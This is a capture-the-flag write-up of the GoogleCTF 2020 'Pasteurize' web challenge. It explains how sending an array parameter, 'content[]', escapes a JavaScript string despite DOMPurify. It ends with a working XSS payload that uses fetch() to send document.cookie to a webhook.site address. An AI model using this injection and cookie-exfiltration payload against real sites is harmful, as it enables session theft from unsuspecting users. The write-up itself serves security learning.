---
title: "GoogleCTF 2020: Pasteurize"
date: 2020-08-23T17:35:14-06:00
draft: false
comments: false
images:
tags:
    - web
    - xss

categories:
  - writeups
---

This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!

## Let's Begin!

The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
When you make a note, you have an option to share it with a "TjMike" Entity. Sign of XSS/CSRF attacks?

{{< image src="/images/google2020pastdompur.png" alt="Login" position="center" style="border-radius: 8px;" >}}
_My input, "uwu", is shoved into a javascript string variable called 'note'. Further down we see a_ ``const clean`` _variable that calls DOMpurify to sanitize our input._


Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever we want. Let's focus on the comment.

{{< image src="/images/google2020source.png" alt="Login" position="center" style="border-radius: 8px;" >}}

Going to the ``/source`` endpoint takes us, well, directly to the webpage's app file. 

Of note are the app's use of using the Express BodyParser to operate on 'extended' mode (using the `qs` library instead of the `querystring` library).

{{< image src="/images/Google2020bodyparser.png" alt="Login" position="center" style="border-radius: 8px;" >}}

In the source we also see:

{{< image src="/images/google2020json.png" alt="Login" position="center" style="border-radius: 8px;" >}}

``JSON.stringify(unsafe)`` - if our content (unsafe) is a string, then the function simply adds additional quotation marks onto the string, and the ``slice(1,-1)`` function removes those extra quotations, before feeding it to the DOM to be rendered. What if our input isn't a string - what if it's an array? 

The [``qs``](https://www.npmjs.com/package/qs#parsing-arrays) library allows arrays to be parsed from HTTP requests if theyre stipulated as:

```
{
    array[]=a&array[]=b

    //array = [a,b]
}
```

When we make a note (POST request to ``/note``), intercept the request via burpsuite. Modify your query there. Change ``content=`` to ``content[]=`` (Alternatively, you can CURL your request to not deal with proxy settings).


{{< image src="/images/google2020pastalert.png" alt="Login" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/google2020xss.png" alt="Login" position="center" style="border-radius: 8px;" >}}

If we go to the page, we see that an alert is prompted - aka, we have succesfully escaped the JS string and can write javascript code as normal. That being said, let's go ahead and craft a payload to xss TJMike (I am being lazy and reusing an old payload of mine from before and modifying it).

```
content[]=; document.getElementById('note-content').onLoad = fetch('https://webhook.site/64627794-30a4-466d-b93a-537bdebca744', {method:'POST', body:JSON.stringify({data:document.cookie})});const uwu = 
```

Share our note to TJMike. Wait for our server to grab their cookie. 

{{< image src="/images/googlectf2020pastflag.png" alt="Login" position="center" style="border-radius: 8px;" >}}

Jam